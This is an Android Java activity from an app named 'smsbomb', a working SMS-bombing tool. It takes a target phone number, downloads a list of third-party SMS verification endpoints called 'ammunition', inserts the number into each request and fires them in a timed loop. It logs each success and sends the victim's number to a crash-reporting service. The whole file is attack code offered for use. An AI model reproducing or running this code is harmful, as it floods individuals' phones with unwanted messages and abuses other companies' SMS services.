package com.yuxie.smsbomb.activity;

import android.os.Bundle;
import android.support.v4.content.ContextCompat;
import android.support.v7.widget.AppCompatEditText;
import android.support.v7.widget.AppCompatTextView;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.RelativeLayout;
import android.widget.ScrollView;

import com.apkupdate.UpdateActivity;
import com.apkupdate.widget.ApkVersionModel;
import com.baselib.base.BaseActivity;
import com.baselib.basebean.BaseRespose;
import com.baselib.baserx.RxSchedulers;
import com.baselib.baserx.RxSubscriber;
import com.baselib.uitls.CommonUtils;
import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.KeyboardUtils;
import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.ToastUtils;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.jaeger.library.StatusBarUtil;
import com.tencent.bugly.crashreport.CrashReport;
import com.yuxie.smsbomb.R;
import com.yuxie.smsbomb.api.ServerApiService;
import com.yuxie.smsbomb.api.server.ServerApi;
import com.yuxie.smsbomb.bean.SmsApi;
import com.yuxie.smsbomb.utils.CRequest;

import org.json.JSONObject;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import butterknife.BindView;
import butterknife.ButterKnife;
import butterknife.OnClick;
import retrofit2.adapter.rxjava.Result;
import rx.Subscriber;
import rx.schedulers.Schedulers;

public class SmsApiActivity extends BaseActivity {

    @BindView(R.id.phone_number)
    AppCompatEditText phoneNumber;

    int successTotol = 0;

    boolean isStop = false;
    @BindView(R.id.rl_left)
    RelativeLayout rlLeft;
    @BindView(R.id.tvContent)
    AppCompatTextView tvContent;
    @BindView(R.id.sv)
    ScrollView sv;

    private List<SmsApi> smsApiList = new ArrayList<>();

    @Override
    public int getLayoutId() {
        return R.layout.activity_sms_api;
    }

    protected void setStatusBarColor() {
        int mStatusBarColor = ContextCompat.getColor(mContext, com.baselib.R.color.status_bar_color);
        StatusBarUtil.setColorForSwipeBack(this, mStatusBarColor, 0);
    }

    @Override
    protected void initView(Bundle savedInstanceState) {
        rlLeft.setVisibility(View.INVISIBLE);
        setTitle(getString(R.string.app_name));

        msg("初始化成功!");

        update();
    }

    @OnClick({R.id.start, R.id.stop})
    public void onViewClicked(View view) {
        KeyboardUtils.hideSoftInput(view);
        switch (view.getId()) {
            case R.id.start:
                //失去焦点
                String phone = CommonUtils.getViewContent(phoneNumber);
                if (TextUtils.isEmpty(phone) || phone.length() != 11) {
                    ToastUtils.showShort("请输入目标手机号");
                    return;
                }
                getApi(phone);
                break;
            case R.id.stop:
                isStop = true;
                break;
        }
    }

    private void fire(final String phoneNumber) {
        successTotol = 0;

        isStop = false;
        msg("开火...");

        new Thread(() -> {
            for (SmsApi smsApi : smsApiList) {
                if (isStop) {
                    msg("------成功数量: " + successTotol + " 次------");
                    msg("已经停火...");
                    return;
                }
                fire(phoneNumber, smsApi);
                try {
                    Thread.sleep(500);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            msg("------成功数量: " + successTotol + " 次------");
            msg("------任务结束------");
        }).start();


    }

    private void getApi(String phoneNumber) {

        if (smsApiList.size() > 0) {
            fire(phoneNumber);
            return;
        }

        mRxManager.add(ServerApi.getInstance().smsApi()
                .compose(RxSchedulers.io_main())
                .subscribe(new RxSubscriber<BaseRespose<List<SmsApi>>>(mContext) {
                    @Override
                    protected void _onNext(BaseRespose<List<SmsApi>> baseRespose) {
                        smsApiList = baseRespose.getData();
                        msg("获取弹药成功! 数量:" + smsApiList.size());
                        fire(phoneNumber);
                    }

                    @Override
                    protected void _onError(String message) {

                    }
                }));
    }

    private void fire(String phoneNumber, final SmsApi smsApi) {

        String host;
        String path;
        try {
            URL urlHost = new URL(smsApi.getUrl());
            host = "http://" + urlHost.getHost();
            if (smsApi.getUrl().contains("https")) {
                host = "https://" + urlHost.getHost();
            }
            path = urlHost.getPath();
        } catch (MalformedURLException e) {
            e.printStackTrace();
            Log.i("TAG", smsApi.getId() + "异常，url:" + smsApi.getUrl());
            return;
        }

        String url = smsApi.getUrl();
        String body = "";

        if ("post".equals(smsApi.getType())) {
            if (url.contains("?")) {
                url = url.replaceAll("target_phone", phoneNumber);
                body = CRequest.TruncateUrlPage(url);
                url = CRequest.UrlPage(url);
            } else {
                body = smsApi.getBody().replaceAll("target_phone", phoneNumber);
            }
        } else {
            url = url.replaceAll("target_phone", phoneNumber);
            body = CRequest.TruncateUrlPage(url);
        }

        ServerApiService serverApiService = ServerApi.getInstance(host);
        if ("post".equals(smsApi.getType())) {
            if (body.contains("{") || body.contains("}")) {
                mRxManager.add(serverApiService.getSmsApi(url, new JsonParser().parse(body).getAsJsonObject()).subscribeOn(Schedulers.io())
                        .subscribe(new MySubscriber(phoneNumber, host, smsApi)));
            } else {
                Map<String, String> options = CRequest.URLRequestParameter(body);
                mRxManager.add(serverApiService.getSmsApi(url, options).subscribeOn(Schedulers.io())
                        .subscribe(new MySubscriber(phoneNumber, host, smsApi)));
            }
        } else {
            if (!TextUtils.isEmpty(path)) {
                path = path.substring(1);
            }
            String pathUrl = path + "?" + body;
            mRxManager.add(serverApiService.getSmsApi(pathUrl).subscribeOn(Schedulers.io())
                    .subscribe(new MySubscriber(phoneNumber, host, smsApi)));
        }
    }

    class MySubscriber extends Subscriber<Result<String>> {

        SmsApi smsApi;
        String phoneNumber;
        String url;

        public MySubscriber(String phoneNumber, String url, SmsApi smsApi) {
            this.smsApi = smsApi;
            this.phoneNumber = phoneNumber;
            this.url = url;
        }

        @Override
        public void onCompleted() {

        }

        @Override
        public void onError(Throwable e) {
            e.printStackTrace();
            Log.i("TAG", smsApi.getId() + "异常_onError，url:" + smsApi.getUrl());
        }

        @Override
        public void onNext(Result<String> stringResult) {

            if (stringResult.isError()) {
                Log.i("TAG", smsApi.getId() + "_失败，url:" + url + "  ,body:" + stringResult.error());
                msg("失败: " + url);
                CrashReport.postCatchedException(new Throwable(phoneNumber + ":失败!" + ",信息:" + url + ",返回:" + stringResult.error()));
                return;
            }
            String body = stringResult.response().body();
            if (!TextUtils.isEmpty(body) && body.contains(smsApi.getResultOk())) {
                Log.i("TAG", smsApi.getId() + "_成功，url:" + url + "  ,body:" + body);
                ++successTotol;
                msg("成功: " + url);
                CrashReport.postCatchedException(new Throwable(phoneNumber + ":成功!" + ",信息:" + url + ",返回:" + body));
            } else {
                Log.i("TAG", smsApi.getId() + "_失败，url:" + url + "  ,body:" + body);
                msg("失败: " + url);
                CrashReport.postCatchedException(new Throwable(phoneNumber + ":失败!" + ",信息:" + url + ",返回:" + body));
            }
        }
    }


    public void msg(String msg) {
        try {
            runOnUiThread(() -> {
                if (sv != null) {
                    tvContent.append(msg + "\n");
                    sv.fullScroll(ScrollView.FOCUS_DOWN);
                }
            });
        } catch (Exception e) {
        }
    }

    private void update() {

        mRxManager.add(ServerApi.getInstance().updateApp()
                .compose(RxSchedulers.io_main())
                .subscribe(new RxSubscriber<BaseRespose<ApkVersionModel>>(mContext, false) {
                    @Override
                    protected void _onNext(BaseRespose<ApkVersionModel> baseRespose) {

                        double versionDouble = CommonUtils.string2Double(baseRespose.getData().getAppVersion());
                        String cVersionStr = AppUtils.getAppVersionName();
                        double cVersionDouble = CommonUtils.string2Double(cVersionStr);
                        if (cVersionDouble < versionDouble) {
                            UpdateActivity.start(mContext, baseRespose.getData());
                        }
                    }

                    @Override
                    protected void _onError(String message) {

                    }
                }));
    }

}
